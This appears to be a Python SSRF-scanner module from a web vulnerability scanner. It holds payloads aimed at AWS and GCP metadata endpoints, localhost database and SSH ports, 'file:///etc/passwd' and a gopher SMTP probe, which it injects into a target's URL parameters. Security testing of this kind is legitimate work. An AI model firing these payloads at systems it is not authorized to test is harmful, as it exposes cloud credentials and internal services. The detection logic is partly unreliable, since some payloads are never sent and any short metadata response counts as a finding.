"""
SSRF (Server-Side Request Forgery) Scanner Module
Tests for SSRF vulnerabilities including cloud metadata access
"""

import re
from typing import List, Dict

class SSRFScanner:
    """Smart SSRF vulnerability scanner"""

    def __init__(self, parent_scanner):
        self.scanner = parent_scanner
        self.name = "SSRF Scanner"
        self.payloads = self.generate_ssrf_payloads()

    def generate_ssrf_payloads(self) -> List[Dict]:
        """Generate SSRF test payloads"""
        payloads = [
            # Cloud metadata endpoints
            {
                'payload': 'http://169.254.169.254/latest/meta-data/',
                'type': 'AWS Metadata',
                'evidence': ['ami-id', 'instance-id', 'public-hostname', 'iam/']
            },
            {
                'payload': 'http://metadata.google.internal/computeMetadata/v1/',
                'type': 'GCP Metadata',
                'evidence': ['project/', 'instance/', 'numeric_project_id']
            },
            {
                'payload': 'http://169.254.169.254/metadata/v1/',
                'type': 'Azure Metadata',
                'evidence': ['instance', 'network', 'compute']
            },

            # Internal network probing
            {
                'payload': 'http://localhost/',
                'type': 'Localhost Access',
                'evidence': ['127.0.0.1', 'localhost']
            },
            {
                'payload': 'http://127.0.0.1/',
                'type': 'Localhost Access',
                'evidence': ['apache', 'nginx', 'index of', 'welcome']
            },
            {
                'payload': 'http://0.0.0.0/',
                'type': 'Localhost Access',
                'evidence': ['server', 'index']
            },

            # Internal services
            {
                'payload': 'http://localhost:22',
                'type': 'Internal SSH',
                'evidence': ['SSH', 'OpenSSH']
            },
            {
                'payload': 'http://localhost:3306',
                'type': 'Internal MySQL',
                'evidence': ['mysql', 'mariadb']
            },
            {
                'payload': 'http://localhost:5432',
                'type': 'Internal PostgreSQL',
                'evidence': ['postgres', 'psql']
            },
            {
                'payload': 'http://localhost:6379',
                'type': 'Internal Redis',
                'evidence': ['redis', 'REDIS']
            },
            {
                'payload': 'http://localhost:9200',
                'type': 'Internal Elasticsearch',
                'evidence': ['elasticsearch', 'cluster_name']
            },

            # File protocol
            {
                'payload': 'file:///etc/passwd',
                'type': 'Local File Access',
                'evidence': ['root:x:0:0', '/bin/bash', '/sbin/nologin']
            },

            # Protocol bypass
            {
                'payload': 'gopher://localhost:25/_MAIL',
                'type': 'Gopher Protocol',
                'evidence': ['SMTP', '220']
            },
        ]

        return payloads

    def check_ssrf_indicators(self, response, payload_dict: Dict) -> bool:
        """Check if response indicates successful SSRF"""
        if not response or not response.text:
            return False

        evidence_keywords = payload_dict['evidence']

        # Check for evidence keywords in response
        for keyword in evidence_keywords:
            if keyword.lower() in response.text.lower():
                return True

        # Check for specific response characteristics
        if 'metadata' in payload_dict['payload'].lower():
            # Cloud metadata often returns plain text or specific formats
            if len(response.text) > 0 and len(response.text) < 10000:
                return True

        return False

    def test_parameter(self, url: str, param: str, value: str) -> List[Dict]:
        """Test a single parameter for SSRF"""
        vulnerabilities = []

        for payload_dict in self.payloads[:10]:  # Limit to avoid too many requests
            test_resp = self.scanner.smart_request(
                url,
                params={param: payload_dict['payload']},
                timeout=15
            )

            if test_resp and self.check_ssrf_indicators(test_resp, payload_dict):
                severity = 'CRITICAL' if 'metadata' in payload_dict['type'].lower() else 'HIGH'

                vulnerabilities.append({
                    'type': f'Server-Side Request Forgery (SSRF) - {payload_dict["type"]}',
                    'severity': severity,
                    'url': url,
                    'parameter': param,
                    'payload': payload_dict['payload'],
                    'description': f'SSRF vulnerability allowing {payload_dict["type"]} access via parameter "{param}"',
                    'evidence': test_resp.text[:500]
                })
                break  # Found SSRF, stop testing this parameter

        return vulnerabilities

    def scan(self) -> List[Dict]:
        """Scan for SSRF vulnerabilities"""
        vulnerabilities = []

        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(self.scanner.target)
        params = parse_qs(parsed.query)

        if not params:
            # Try common SSRF parameters
            test_params = ['url', 'uri', 'path', 'dest', 'redirect', 'download', 'fetch',
                          'file', 'src', 'source', 'target', 'link', 'image']
            for param in test_params:
                test_url = f"{self.scanner.target}?{param}=http://example.com"
                resp = self.scanner.smart_request(test_url)
                if resp and resp.status_code == 200:
                    vulns = self.test_parameter(self.scanner.target, param, 'http://example.com')
                    vulnerabilities.extend(vulns)
        else:
            # Test existing parameters
            for param, values in params.items():
                value = values[0] if values else 'http://example.com'
                vulns = self.test_parameter(self.scanner.target, param, value)
                vulnerabilities.extend(vulns)

        return vulnerabilities
